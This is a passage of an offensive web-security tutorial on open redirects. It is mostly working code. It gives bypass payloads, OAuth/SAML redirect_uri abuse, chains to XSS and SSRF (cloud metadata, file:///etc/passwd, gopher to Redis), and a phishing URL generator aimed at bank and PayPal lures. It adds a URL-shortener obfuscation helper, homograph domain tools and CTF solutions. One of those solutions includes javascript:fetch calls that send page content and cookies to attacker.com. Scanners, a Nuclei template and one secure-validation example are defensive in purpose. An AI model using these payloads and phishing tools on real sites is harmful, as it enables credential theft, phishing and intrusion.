  grep -E '(window\.location|location\.href|location\.assign|location\.replace)'

# Extract redirect destination
curl -s "https://target.com/redirect?url=https://evil.com" | \
  grep -oP '(?<=location\s*=\s*["\'])[^"\']+' | head -1
```

**Automated JavaScript Redirect Testing:**

```python
import requests
import re

def test_javascript_redirect(target_url, param, test_domain="evil.com"):
    """Test for JavaScript-based open redirects"""
    
    test_url = f"https://{test_domain}"
    response = requests.get(
        target_url,
        params={param: test_url},
        timeout=5
    )
    
    # JavaScript redirect patterns
    patterns = [
        rb'window\.location\s*=\s*["\']?([^"\';\s]+)',
        rb'location\.href\s*=\s*["\']?([^"\';\s]+)',
        rb'location\.assign\(["\']?([^"\';\)]+)',
        rb'location\.replace\(["\']?([^"\';\)]+)',
        rb'document\.location\s*=\s*["\']?([^"\';\s]+)',
        rb'top\.location\s*=\s*["\']?([^"\';\s]+)',
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, response.content, re.IGNORECASE)
        for match in matches:
            redirect_url = match.decode(errors='ignore')
            if test_domain in redirect_url:
                print(f"[!] JavaScript redirect vulnerability found:")
                print(f"    Pattern matched: {pattern.pattern}")
                print(f"    Redirects to: {redirect_url}")
                return True
    
    return False

test_javascript_redirect("https://target.com/redirect", "url")
```

### DOM-Based Open Redirects

**Client-Side URL Parameter Processing:**

```javascript
// Vulnerable pattern: Reading from URL parameters
var redirect = new URLSearchParams(window.location.search).get('url');
window.location = redirect;  // No validation

// Vulnerable pattern: Reading from hash
var target = window.location.hash.substring(1);
window.location.href = target;

// Vulnerable pattern: document.referrer
if (document.referrer.includes('trusted.com')) {
    window.location = document.referrer;
}
```

**Testing DOM-Based Redirects:**

```html
<!-- Save as test.html and open in browser -->
<!DOCTYPE html>
<html>
<head>
    <title>DOM Redirect Test</title>
</head>
<body>
    <h1>Testing DOM Open Redirect</h1>
    <script>
        // Test payload injection
        var params = new URLSearchParams(window.location.search);
        var redirect_url = params.get('url');
        
        if (redirect_url) {
            console.log("Redirect URL: " + redirect_url);
            
            // Simulate vulnerable redirect after delay
            setTimeout(function() {
                console.log("Redirecting to: " + redirect_url);
                // window.location = redirect_url;  // Uncomment to test actual redirect
            }, 2000);
        }
    </script>
</body>
</html>
```

**Browser-Based Testing:**

```bash
# Open URLs in browser to test DOM redirects
# Look for JavaScript console errors and actual redirects

# Test with various payloads
file:///path/to/test.html?url=https://evil.com
file:///path/to/test.html?url=javascript:alert(1)
file:///path/to/test.html#https://evil.com
```

### JavaScript Redirect Bypass Techniques

**String Concatenation Bypass:**

```javascript
// If filter checks for "evil.com"
var domain = "evi" + "l.com";
window.location = "https://" + domain;

// Using array join
var parts = ["https://", "evil", ".com"];
window.location = parts.join("");

// Using template literals
var target = `${"https://"}${"evil.com"}`;
window.location = target;
```

**Encoding Bypasses:**

```javascript
// Unicode escape sequences
window.location = "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002fevil.com";

// Hex escape sequences
window.location = "\x68\x74\x74\x70\x73\x3a\x2f\x2fevil.com";

// eval with encoded string
eval("window.location='https://evil.com'");

// Function constructor
(new Function("window.location='https://evil.com'"))();
```

**Timing and Async Bypass:**

```javascript
// setTimeout with redirect
setTimeout(function() {
    window.location = 'https://evil.com';
}, 100);

// setInterval
var i = setInterval(function() {
    window.location = 'https://evil.com';
    clearInterval(i);
}, 100);

// Promise-based
Promise.resolve('https://evil.com').then(url => window.location = url);

// Async function
async function redirect() {
    window.location = await Promise.resolve('https://evil.com');
}
redirect();
```

## Advanced Exploitation Scenarios

### OAuth/SAML Redirect Exploitation

**OAuth redirect_uri Parameter:**

```bash
# Open redirect attempt
https://auth.provider.com/oauth/authorize?
  client_id=CLIENT_ID&
  redirect_uri=https://evil.com&
  response_type=code

# Authorization code stolen when user authenticates
# Attacker receives: https://evil.com?code=AUTHORIZATION_CODE
```

**OAuth Redirect Bypass Techniques:**

```bash
# Subdomain bypass (if wildcard allowed)
?redirect_uri=https://evil.trusted.com/callback

# Path traversal
?redirect_uri=https://trusted.com/callback/../../evil.com

# Username in URL
?redirect_uri=https://trusted.com@evil.com/callback

# Open redirect chain
?redirect_uri=https://trusted.com/redirect?url=https://evil.com

# Parameter pollution
?redirect_uri=https://trusted.com/callback&redirect_uri=https://evil.com

# Fragment confusion
?redirect_uri=https://trusted.com/callback#https://evil.com

# Encoded bypass
?redirect_uri=https://trusted.com%2F%2E%2E%2Fevil.com

# IDN homograph attack
?redirect_uri=https://truѕted.com  # Cyrillic 's'
```

**Testing OAuth Redirects:**

```python
import requests
from urllib.parse import urlencode, quote

def test_oauth_redirect_bypass(auth_endpoint, client_id):
    """Test OAuth redirect_uri for open redirect"""
    
    bypass_payloads = [
        "https://evil.com",
        "https://evil.com/callback",
        "https://trusted.com@evil.com",
        "https://trusted.com/../evil.com",
        "https://trusted.com#@evil.com",
        "https://evil.trusted.com",
        "https://trusted.com.evil.com",
        quote("https://evil.com"),
        "https://trusted.com%2F..%2Fevil.com",
        "https://trusted.com\\.evil.com",
    ]
    
    for payload in bypass_payloads:
        params = {
            'client_id': client_id,
            'redirect_uri': payload,
            'response_type': 'code',
            'scope': 'openid',
            'state': 'test123'
        }
        
        try:
            response = requests.get(
                auth_endpoint,
                params=params,
                allow_redirects=False,
                timeout=5
            )
            
            # Check if authorization page shown (validation passed)
            if response.status_code == 200 and b'authorize' in response.content.lower():
                print(f"[!] VULNERABLE: {payload}")
                print(f"    Redirect_uri accepted by authorization server")
            
            # Check if immediate redirect occurs
            elif 'Location' in response.headers:
                location = response.headers['Location']
                if 'evil.com' in location:
                    print(f"[!] VULNERABLE: {payload}")
                    print(f"    Immediate redirect to: {location}")
        
        except Exception as e:
            print(f"[-] Error testing {payload}: {e}")

# Usage
test_oauth_redirect_bypass(
    "https://auth.provider.com/oauth/authorize",
    "client_id_here"
)
```

**SAML Relay State Exploitation:**

```bash
# SAML authentication with RelayState parameter
https://idp.provider.com/saml/sso?
  SAMLRequest=BASE64_ENCODED_REQUEST&
  RelayState=https://trusted.com/dashboard

# Open redirect via RelayState
https://idp.provider.com/saml/sso?
  SAMLRequest=BASE64_ENCODED_REQUEST&
  RelayState=https://evil.com

# After authentication, user redirected to evil.com
# May include SAML assertion in URL
```

**Testing SAML RelayState:**

```python
import requests
import base64

def test_saml_relaystate(idp_endpoint, saml_request):
    """Test SAML RelayState for open redirect"""
    
    test_redirects = [
        "https://evil.com",
        "https://evil.com/steal",
        "javascript:alert(document.domain)",
        "data:text/html,<script>alert(1)</script>",
    ]
    
    for redirect in test_redirects:
        params = {
            'SAMLRequest': saml_request,
            'RelayState': redirect
        }
        
        try:
            response = requests.get(
                idp_endpoint,
                params=params,
                allow_redirects=False,
                timeout=5
            )
            
            if 'Location' in response.headers:
                location = response.headers['Location']
                if redirect in location:
                    print(f"[!] VULNERABLE RelayState: {redirect}")
                    print(f"    Final location: {location}")
        
        except Exception as e:
            continue

# Generate sample SAML request (simplified)
saml_xml = """<samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
</samlp:AuthnRequest>"""
saml_encoded = base64.b64encode(saml_xml.encode()).decode()

test_saml_relaystate("https://idp.provider.com/saml/sso", saml_encoded)
```

### Chaining with Other Vulnerabilities

**Open Redirect → XSS:**

```javascript
// Redirect to JavaScript protocol for XSS
?url=javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))
// Decoded: alert(document.domain)

// Redirect to data URI with XSS
?url=data:text/html,<script>alert(document.domain)</script>

// Chain with DOM XSS
?url=https://trusted.com/page?xss=<script>alert(1)</script>
```

**Open Redirect → SSRF:**

```bash
# Redirect to internal network
?url=http://192.168.1.1/admin
?url=http://localhost:8080/internal
?url=http://169.254.169.254/latest/meta-data/  # AWS metadata

# Gopher protocol for SSRF
?url=gopher://internal-server:6379/_SET%20key%20value

# File protocol for LFI
?url=file:///etc/passwd
?url=file:///c:/windows/win.ini
```

**Open Redirect → Session Fixation:**

```bash
# Force victim to authenticate with attacker-controlled session
?url=https://target.com/login?session=ATTACKER_SESSION_ID

# OAuth flow manipulation
?url=https://oauth.provider.com/authorize?client_id=ATTACKER_CLIENT
```

**Testing Chained Exploits:**

```python
import requests

def test_redirect_chain(target_url, param):
    """Test open redirect chains with other vulnerabilities"""
    
    # XSS payloads via redirect
    xss_payloads = [
        "javascript:alert(document.domain)",
        "javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))",
        "data:text/html,<script>alert(document.cookie)</script>",
    ]
    
    # SSRF payloads via redirect
    ssrf_payloads = [
        "http://localhost:8080/admin",
        "http://127.0.0.1:6379/",
        "http://169.254.169.254/latest/meta-data/",
        "gopher://localhost:6379/_INFO",
        "file:///etc/passwd",
    ]
    
    # Test XSS chains
    print("[*] Testing XSS chains:")
    for payload in xss_payloads:
        response = requests.get(
            target_url,
            params={param: payload},
            allow_redirects=False,
            timeout=5
        )
        
        if payload.encode() in response.content:
            print(f"[!] XSS payload reflected: {payload[:50]}...")
    
    # Test SSRF chains
    print("\n[*] Testing SSRF chains:")
    for payload in ssrf_payloads:
        try:
            response = requests.get(
                target_url,
                params={param: payload},
                allow_redirects=True,  # Follow redirects to test SSRF
                timeout=5
            )
            
            # Check for internal service responses
            internal_indicators = [
                b'redis',
                b'root:',
                b'ami-id',
                b'Admin Panel',
            ]
            
            for indicator in internal_indicators:
                if indicator in response.content.lower():
                    print(f"[!] Potential SSRF: {payload}")
                    break
        
        except Exception as e:
            continue

test_redirect_chain("https://target.com/redirect", "url")
```

### Phishing Campaign Integration

**Realistic Phishing URL Construction:**

```python
from urllib.parse import urlencode

def generate_phishing_url(legitimate_domain, attacker_domain, context="password_reset"):
    """Generate convincing phishing URLs using open redirect"""
    
    templates = {
        "password_reset": {
            "path": "/auth/reset",
            "params": {
                "token": "valid_looking_token_12345",
                "redirect": f"https://{attacker_domain}/fake-reset"
            }
        },
        "payment": {
            "path": "/checkout/confirm",
            "params": {
                "order_id": "ORD-2024-12345",
                "next": f"https://{attacker_domain}/fake-payment"
            }
        },
        "login": {
            "path": "/login",
            "params": {
                "return": f"https://{attacker_domain}/fake-login",
                "session_expired": "true"
            }
        },
        "verification": {
            "path": "/verify/account",
            "params": {
                "code": "VERIFY123",
                "continue": f"https://{attacker_domain}/fake-verify"
            }
        }
    }
    
    template = templates.get(context, templates["login"])
    query_string = urlencode(template["params"])
    
    phishing_url = f"https://{legitimate_domain}{template['path']}?{query_string}"
    
    print(f"[*] Phishing Context: {context}")
    print(f"[*] Phishing URL: {phishing_url}")
    print(f"[*] Victim sees: {legitimate_domain}")
    print(f"[*] Actually goes to: {attacker_domain}")
    
    return phishing_url

# Generate various phishing scenarios
generate_phishing_url("trusted-bank.com", "evil-phishing.com", "password_reset")
print()
generate_phishing_url("paypal.com", "evil-phishing.com", "payment")
```

**URL Shortening for Obfuscation:**

```python
import requests

def shorten_malicious_url(long_url, shortener_api="https://is.gd/create.php"):
    """
    [Inference] Use URL shorteners to hide open redirect URLs
    Many shorteners may block known malicious domains
    """
    
    try:
        response = requests.get(
            shortener_api,
            params={
                'format': 'simple',
                'url': long_url
            },
            timeout=5
        )
        
        if response.status_code == 200:
            short_url = response.text.strip()
            print(f"[+] Shortened URL: {short_url}")
            print(f"    Original: {long_url}")
            return short_url
    
    except Exception as e:
        print(f"[-] Shortening failed: {e}")
    
    return None

# Example usage
malicious_redirect = "https://trusted.com/redirect?url=https://evil.com/phishing"
shorten_malicious_url(malicious_redirect)
```

### Mobile Application Redirects

**Deep Link Exploitation:**

```bash
# Android deep link scheme
myapp://redirect?url=https://evil.com

# iOS Universal Link manipulation
https://trusted.com/app/redirect?url=https://evil.com

# Custom scheme with JavaScript
customscheme://action?param=javascript:alert(1)
```

**Testing Mobile Deep Links:**

```bash
# Using ADB for Android testing
adb shell am start -W -a android.intent.action.VIEW \
  -d "myapp://redirect?url=https://evil.com"

# Monitor logcat for errors
adb logcat | grep -i "redirect\|url"

# iOS testing with idevice tools
idevicedebug run com.app.bundle \
  --args "myapp://redirect?url=https://evil.com"
```

**Frida Script for Mobile Redirect Testing:**

```javascript
// Save as redirect_hook.js
// Usage: frida -U -f com.target.app -l redirect_hook.js

Java.perform(function() {
    // Hook Android Intent handling
    var Intent = Java.use('android.content.Intent');
    
    Intent.getData.implementation = function() {
        var uri = this.getData();
        if (uri != null) {
            var url = uri.toString();
            console.log('[*] Intent URL: ' + url);
            
            // Check for open redirect
            if (url.indexOf('redirect') !== -1 || url.indexOf('url=') !== -1) {
                console.log('[!] Potential open redirect: ' + url);
            }
        }
        return uri;
    };
    
    // Hook WebView URL loading
    var WebView = Java.use('android.webkit.WebView');
    
    WebView.loadUrl.overload('java.lang.String').implementation = function(url) {
        console.log('[*] WebView loading: ' + url);
        
        if (url.startsWith('javascript:') || url.startsWith('data:')) {
            console.log('[!] Suspicious protocol: ' + url);
        }
        
        return this.loadUrl(url);
    };
});
```

## Exploitation Tools and Frameworks

### Custom Open Redirect Scanner

```python
#!/usr/bin/env python3
import requests
import argparse
from urllib.parse import urlparse, urlencode
from concurrent.futures import ThreadPoolExecutor
import re

class OpenRedirectScanner:
    def __init__(self, target_url, test_domain="evil.com"):
        self.target_url = target_url
        self.test_domain = test_domain
        self.vulnerable_params = []
        
        self.redirect_params = [
            'url', 'redirect', 'next', 'return', 'returnTo', 'redirect_uri',
            'continue', 'dest', 'destination', 'redir', 'redirect_url',
            'return_path', 'callback', 'go', 'target', 'to', 'goto',
            'exit', 'out', 'view', 'forward', 'link', 'site'
        ]
        
        self.payloads = self._generate_payloads()
    
    def _generate_payloads(self):
        """Generate comprehensive bypass payloads"""
        base_url = f"https://{self.test_domain}"
        
        payloads = [
            # Basic
            base_url,
            f"//{self.test_domain}",
            f"/{self.test_domain}",
            
            # Protocol variations
            f"javascript:alert('{self.test_domain}')",
            f"data:text/html,<script>location='{base_url}'</script>",
            
            # Encoding
            base_url.replace('/', '%2F'),
            base_url.replace(':', '%3A'),
            
            # Whitelist bypass
            f"{base_url}@target.com",
            f"target.com@{base_url}",
            f"{self.test_domain}.target.com",
            f"target.com.{self.test_domain}",
            
            # Path traversal
            f"target.com/../{self.test_domain}",
            f"target.com/..%2F{self.test_domain}",
            
            # Fragment/query
            f"target.com#{base_url}",
            f"target.com?{base_url}",
        ]
        
        return payloads
    
    def test_parameter(self, param, payload):
        """Test single parameter with payload"""
        try:
            response = requests.get(
                self.target_url,
                params={param: payload},
                allow_redirects=False,
                timeout=5
            )
            
            # Check Location header
            if 'Location' in response.headers:
                location = response.headers['Location']
                if self.test_domain in location:
                    return {
                        'param': param,
                        'payload': payload,
                        'method': 'Location header',
                        'redirect_to': location
                    }
            
            # Check meta refresh
            if b'http-equiv="refresh"' in response.content.lower():
                if self.test_domain.encode() in response.content:
                    return {
                        'param': param,
                        'payload': payload,
                        'method': 'Meta refresh'
                    }
            
            # Check JavaScript redirect
            js_patterns = [
                rb'window\.location\s*=\s*["\']?([^"\';\s]+)',
                rb'location\.href\s*=\s*["\']?([^"\';\s]+)',
                rb'location\.replace\(["\']?([^"\';\)]+)',
            ]
            
            for pattern in js_patterns:
                matches = re.findall(pattern, response.content, re.IGNORECASE)
                for match in matches:
                    if self.test_domain.encode() in match:
                        return {
                            'param': param,
                            'payload': payload,
                            'method': 'JavaScript redirect',
                            'redirect_to': match.decode(errors='ignore')
                        }
        
        except Exception as e:
            pass
        
        return None
    
    def scan(self):
        """Scan all parameters with all payloads"""
        print(f"[*] Scanning {self.target_url}")
        print(f"[*] Testing {len(self.redirect_params)} parameters with {len(self.payloads)} payloads")
        
        results = []
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            
            for param in self.redirect_params:
                for payload in self.payloads:
                    future = executor.submit(self.test_parameter, param, payload)
                    futures.append(future)
            
            for future in futures:
                result = future.result()
                if result:
                    results.append(result)
                    print(f"\n[!] VULNERABLE PARAMETER FOUND:")
                    print(f"    Parameter: {result['param']}")
                    print(f"    Payload: {result['payload'][:80]}")
                    print(f"    Method: {result['method']}")
                    if 'redirect_to' in result:
                        print(f"    Redirects to: {result['redirect_to']}")
        
        return results

def main():
    parser = argparse.ArgumentParser(description='Open Redirect Scanner')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-d', '--domain', default='evil.com', help='Test domain')
    parser.add_argument('-o', '--output', help='Output file for results')
    
    args = parser.parse_args()
    
    scanner = OpenRedirectScanner(args.url, args.domain)
    results = scanner.scan()
    
    print(f"\n[*] Scan complete. Found {len(results)} vulnerabilities.")
    
    if args.output and results:
        with open(args.output, 'w') as f:
            for result in results:
                f.write(f"{result}\n")
        print(f"[*] Results saved to {args.output}")

if __name__ == '__main__':
    main()
```

**Usage:**

```bash
# Basic scan
python3 open_redirect_scanner.py -u "https://target.com/redirect"

# Custom test domain
python3 open_redirect_scanner.py -u "https://target.com/login" -d "attacker.com"

# Save results
python3 open_redirect_scanner.py -u "https://target.com/oauth/callback" -o results.txt
```

### Burp Suite Extension

**Python Burp Extension for Open Redirect Detection:**

```python
# Save as open_redirect_detector.py
# Load in Burp: Extender → Extensions → Add → Python

from burp import IBurpExtender, IScannerCheck, IScanIssue
from java.net import URL

class BurpExtender(IBurpExtender, IScannerCheck):
    
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("Open Redirect Detector")
        callbacks.registerScannerCheck(self)
        print("[*] Open Redirect Detector loaded")
    
    def doPassiveScan(self, baseRequestResponse):
        """Passive scan for open redirect patterns"""
        issues = []
        
        response = baseRequestResponse.getResponse()
        if response is None:
            return None
        
        response_str = self._helpers.bytesToString(response)
        
        # Check for redirect indicators
        redirect_patterns = [
            'Location:',
            'http-equiv="refresh"',
            'window.location',
            'location.href',
            'location.replace'
        ]
        
        for pattern in redirect_patterns:
            if pattern in response_str:
                # Check if user input influences redirect
                request = baseRequestResponse.getRequest()
                parameters = self._helpers.analyzeRequest(request).getParameters()
                
                for param in parameters:
                    param_name = param.getName()
                    param_value = param.getValue()
                    
                    if param_value and param_value in response_str:
                        issues.append(self._create_issue(
                            baseRequestResponse,
                            param_name,
                            pattern
                        ))
        
        return issues if issues else None
    
    def doActiveScan(self, baseRequestResponse, insertionPoint):
        """Active scan with payload injection"""
        issues = []
        
        test_payloads = [
            "https://evil.com",
            "//evil.com",
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>"
        ]
        
        for payload in test_payloads:
            check_request = insertionPoint.buildRequest(payload)
            check_response = self._callbacks.makeHttpRequest(
                baseRequestResponse.getHttpService(),
                check_request
            )
            
            response = check_response.getResponse()
            if response:
                response_str = self._helpers.bytesToString(response)
                
                # Check if payload appears in redirect
                if ('Location: ' in response_str and 'evil.com' in response_str) or \
                   ('evil.com' in response_str and 'location' in response_str.lower()):
                    
                    issues.append(self._create_issue(
                        check_response,
                        insertionPoint.getInsertionPointName(),
                        "Active scan payload: " + payload
                    ))
        
        return issues if issues else None
    
    def _create_issue(self, requestResponse, param_name, evidence):
        """Create scanner issue"""
        return CustomScanIssue(
            requestResponse.getHttpService(),
            self._helpers.analyzeRequest(requestResponse).getUrl(),
            [requestResponse],
            "Open Redirect Vulnerability",
            f"Parameter '{param_name}' may be vulnerable to open redirect. Evidence: {evidence}",
            "High"
        )

class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, severity):
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail
        self._severity = severity
    
    def getUrl(self):
        return self._url
    
    def getIssueName(self):
        return self._name
    
    def getIssueType(self):
        return 0
    
    def getSeverity(self):
        return self._severity
    
    def getConfidence(self):
        return "Certain"
    
    def getIssueBackground(self):
        return "Open redirect vulnerabilities allow attackers to redirect users to malicious sites."
    
    def getRemediationBackground(self):
        return "Validate and whitelist redirect destinations."
    
    def getIssueDetail(self):
        return self._detail
    
    def getRemediationDetail(self):
        return None
    
    def getHttpMessages(self):
        return self._httpMessages
    
    def getHttpService(self):
        return self._httpService
```

### Nuclei Template

**Open Redirect Detection Template:**

```yaml
# Save as open-redirect.yaml
# Usage: nuclei -t open-redirect.yaml -u https://target.com

id: open-redirect-detection

info:
  name: Open Redirect Detection
  author: security-researcher
  severity: medium
  description: Detects open redirect vulnerabilities
  tags: redirect,misconfig

requests:
  - method: GET
    path:
      - "{{BaseURL}}/redirect?url=https://evil.com"
      - "{{BaseURL}}/login?next=https://evil.com"
      - "{{BaseURL}}/logout?return=//evil.com"
      - "{{BaseURL}}/oauth/callback?redirect_uri=https://evil.com"
      - "{{BaseURL}}/?continue=https://evil.com"
    
    redirects: false
    max-redirects: 0
    
    matchers-condition: or
    matchers:
      - type: regex
        part: header
        regex:
          - '(?i)Location:\s*https?://evil\.com'
          - '(?i)Location:\s*//evil\.com'
      
      - type: word
        part: body
        words:
          - 'http-equiv="refresh"'
          - 'content="0;url=https://evil.com'
        condition: and
      
      - type: regex
        part: body
        regex:
          - '(?i)window\.location\s*=\s*["\']https://evil\.com'
          - '(?i)location\.href\s*=\s*["\']https://evil\.com'
    
    extractors:
      - type: kval
        part: header
        kval:
          - Location
```

**Running Nuclei:**

```bash
# Single target
nuclei -t open-redirect.yaml -u https://target.com

# Multiple targets
nuclei -t open-redirect.yaml -l targets.txt

# With custom payloads
nuclei -t open-redirect.yaml -u https://target.com -var evil=attacker.com
```

## CTF-Specific Scenarios

### Example 1: Hidden Redirect Parameter

```bash
# Challenge: Find hidden redirect parameter
# Solution: Parameter discovery

# Step 1: Use parameter fuzzing
ffuf -u "https://ctf.example.com/login?FUZZ=https://evil.com" \
  -w /usr/share/wordlists/burp-parameter-names.txt \
  -mc 301,302 \
  -fs 0

# Output reveals: 'dest_url' parameter redirects

# Step 2: Test the parameter
curl -I "https://ctf.example.com/login?dest_url=https://evil.com/flag"

# Step 3: Extract flag from redirect
# Location: https://evil.com/flag?secret=CTF{h1dd3n_p4r4m}
```

### Example 2: JavaScript Protocol for XSS

```python
# Challenge: Use open redirect to achieve XSS
# Solution:

import requests

target = "https://ctf.example.com/redirect"

# Test JavaScript protocol
payloads = [
    "javascript:alert(document.domain)",
    "javascript:fetch('https://attacker.com/steal?flag='+document.body.innerHTML)",
    "javascript:eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vYXR0YWNrZXIuY29tL2ZsYWc/Jytkb2N1bWVudC5jb29raWU='))"
]

for payload in payloads:
    response = requests.get(
        target,
        params={'next': payload},
        allow_redirects=False
    )
    
    if 'javascript:' in response.headers.get('Location', '').lower():
        print(f"[!] XSS via redirect: {payload}")
        # Visit URL in browser to execute JavaScript and retrieve flag
```

### Example 3: OAuth Code Theft

```bash
# Challenge: Steal OAuth authorization code
# Solution: Open redirect in redirect_uri

# Step 1: Identify OAuth endpoint
https://ctf.example.com/oauth/authorize?
  client_id=public_client&
  redirect_uri=https://ctf.example.com/callback&
  response_type=code

# Step 2: Test redirect_uri bypass
https://ctf.example.com/oauth/authorize?
  client_id=public_client&
  redirect_uri=https://attacker.com/steal&
  response_type=code

# Step 3: Victim authorizes, code sent to attacker
# https://attacker.com/steal?code=AUTH_CODE_WITH_FLAG

# Step 4: Exchange code for flag
curl -X POST https://ctf.example.com/oauth/token \
  -d "code=AUTH_CODE_WITH_FLAG" \
  -d "client_id=public_client" \
  -d "grant_type=authorization_code"

# Response: {"access_token": "flag{0auth_r3d1r3ct}"}
```

### Example 4: SSRF via Redirect

```python
# Challenge: Access internal service via open redirect
# Solution: Chain redirect with SSRF

import requests

target = "https://ctf.example.com/redirect"

# Test internal network access
internal_targets = [
    "http://localhost:8080/flag",
    "http://127.0.0.1:9000/admin",
    "http://192.168.1.1/internal/flag",
    "http://internal.ctf.local/secret"
]

for internal_url in internal_targets:
    try:
        response = requests.get(
            target,
            params={'url': internal_url},
            allow_redirects=True,  # Follow redirect to internal service
            timeout=10
        )
        
        if 'flag{' in response.text:
            print(f"[!] Flag found via SSRF:")
            print(f"    Internal URL: {internal_url}")
            import re
            flag = re.search(r'flag\{[^}]+\}', response.text)
            print(f"    Flag: {flag.group()}")
            break
    
    except Exception as e:
        continue
```

## Mitigation and Defense Evasion

### Common Defenses and Bypasses

**Whitelist Validation:**

```python
# Vulnerable validation
def is_valid_redirect(url):
    allowed_domains = ['trusted.com', 'partner.com']
    for domain in allowed_domains:
        if domain in url:
            return True
    return False

# Bypass: evil.trusted.com or trusted.com.evil.com passes check
```

**Regex Bypass:**

```python
# Vulnerable regex
import re

def validate_redirect(url):
    pattern = r'^https?://trusted\.com'
    if re.match(pattern, url):
        return True
    return False

# Bypass techniques:
# 1. Username bypass
bypass1 = "https://trusted.com@evil.com"  # Passes regex, redirects to evil.com

# 2. Subdomain bypass
bypass2 = "https://trusted.com.evil.com"  # Passes if not checking full domain

# 3. Path traversal
bypass3 = "https://trusted.com/../evil.com"  # May pass simple regex

# 4. Fragment bypass
bypass4 = "https://trusted.com#@evil.com"  # Passes regex check
```

**Testing Regex Weaknesses:**

```python
import re

def test_regex_bypass(regex_pattern, test_urls):
    """Test if regex can be bypassed"""
    
    compiled = re.compile(regex_pattern)
    
    for url in test_urls:
        if compiled.match(url):
            print(f"[!] Bypass successful: {url}")
            print(f"    Regex: {regex_pattern}")
        else:
            print(f"[-] Blocked: {url}")

# Common vulnerable regex patterns
vulnerable_patterns = [
    r'^https?://trusted\.com',  # Only checks start
    r'trusted\.com',  # Checks if string contains domain
    r'https?://[^/]*trusted\.com',  # Allows subdomains
]

bypass_attempts = [
    "https://trusted.com@evil.com",
    "https://evil.com/trusted.com",
    "https://trusted.com.evil.com",
    "https://evil-trusted.com",
    "https://trusted.com%2F@evil.com",
    "https://trusted.com#@evil.com",
]

for pattern in vulnerable_patterns:
    print(f"\n[*] Testing pattern: {pattern}")
    test_regex_bypass(pattern, bypass_attempts)
```

**Proper URL Parsing Defense:**

```python
from urllib.parse import urlparse

def secure_redirect_validation(url, allowed_domains):
    """Secure redirect validation using proper URL parsing"""
    
    try:
        parsed = urlparse(url)
        
        # Check scheme
        if parsed.scheme not in ['http', 'https']:
            print(f"[-] Invalid scheme: {parsed.scheme}")
            return False
        
        # Extract netloc (handles username, port correctly)
        netloc = parsed.netloc
        
        # Remove port if present
        if ':' in netloc:
            netloc = netloc.split(':')[0]
        
        # Remove username if present
        if '@' in netloc:
            netloc = netloc.split('@')[1]
        
        # Check if domain is in whitelist
        if netloc in allowed_domains:
            print(f"[+] Valid redirect: {netloc}")
            return True
        
        # Check for subdomain matching if needed
        for allowed in allowed_domains:
            if netloc.endswith('.' + allowed):
                print(f"[+] Valid subdomain: {netloc}")
                return True
        
        print(f"[-] Domain not allowed: {netloc}")
        return False
    
    except Exception as e:
        print(f"[-] Parsing error: {e}")
        return False

# Test with bypass attempts
allowed = ['trusted.com', 'partner.com']

test_urls = [
    "https://trusted.com/dashboard",  # Valid
    "https://subdomain.trusted.com",  # Valid subdomain
    "https://trusted.com@evil.com",  # Blocked
    "https://trusted.com.evil.com",  # Blocked
    "https://evil.com/trusted.com",  # Blocked
    "javascript:alert(1)",  # Blocked
    "data:text/html,<script>alert(1)</script>",  # Blocked
]

for url in test_urls:
    print(f"\n[*] Testing: {url}")
    secure_redirect_validation(url, allowed)
```

### URL Normalization Bypass

**Unicode and IDN Homograph Attacks:**

```python
def generate_homograph_domains(target_domain):
    """Generate lookalike domains using Unicode characters"""
    
    # Cyrillic lookalikes for Latin characters
    homoglyphs = {
        'a': ['а', 'ạ', 'ä'],  # Cyrillic 'a', Latin with diacritic
        'e': ['е', 'ė', 'ë'],  # Cyrillic 'e'
        'o': ['о', 'ọ', 'ö'],  # Cyrillic 'o'
        'p': ['р', 'ṗ'],       # Cyrillic 'r' looks like 'p'
        'c': ['с', 'ċ'],       # Cyrillic 's' looks like 'c'
        'x': ['х', 'ẋ'],       # Cyrillic 'kh'
    }
    
    variants = [target_domain]
    
    for char, lookalikes in homoglyphs.items():
        if char in target_domain:
            for lookalike in lookalikes:
                variant = target_domain.replace(char, lookalike, 1)
                variants.append(variant)
    
    return variants

# Generate lookalike domains
target = "trusted.com"
lookalikes = generate_homograph_domains(target)

print(f"[*] Original: {target}")
print(f"[*] Lookalike variants:")
for variant in lookalikes[1:]:  # Skip original
    print(f"    {variant}")
    print(f"    URL: https://{variant}")
```

**Punycode IDN Bypass:**

```python
def generate_punycode_bypass(domain):
    """Generate punycode representation for IDN bypass"""
    
    # Example: аpple.com (Cyrillic 'a')
    # Becomes: xn--pple-43d.com in punycode
    
    try:
        # Encode domain to punycode
        punycode = domain.encode('idna').decode('ascii')
        print(f"[*] Original: {domain}")
        print(f"[*] Punycode: {punycode}")
        return punycode
    except Exception as e:
        print(f"[-] Encoding error: {e}")
        return None

# Test with lookalike domain
lookalike = "truѕted.com"  # Cyrillic 's'
punycode_domain = generate_punycode_bypass(lookalike)

if punycode_domain:
    test_url = f"https://{punycode_domain}/phishing"
    print(f"[*] Test URL: {test_url}")
```

**URL Normalization Issues:**

```bash
# Backslash vs forward slash
?url=https:\\evil.com  # May normalize to https://evil.com

# Multiple slashes
?url=https:///evil.com
?url=https:////evil.com

# Mixed separators
?url=https:/\\/evil.com

# Null bytes (historical)
?url=https://trusted.com%00.evil.com

# CRLF injection in redirect
?url=https://trusted.com%0d%0aLocation:%20https://evil.com

# Tab and newline
?url=https://trusted.com%09evil.com
?url=https://trusted.com%0aevil.com
```

**Testing Normalization:**

```python
import requests
from urllib.parse import urlparse

def test_url_normalization(target_url, param='url'):
    """Test how application normalizes URLs"""
    
    test_cases = [
        "https://evil.com",
        "https:\\\\evil.com",
        "https:\\/\\/evil.com",
        "https:///evil.com",
        "HTTPS://EVIL.COM",
        "https://evil.com:443",
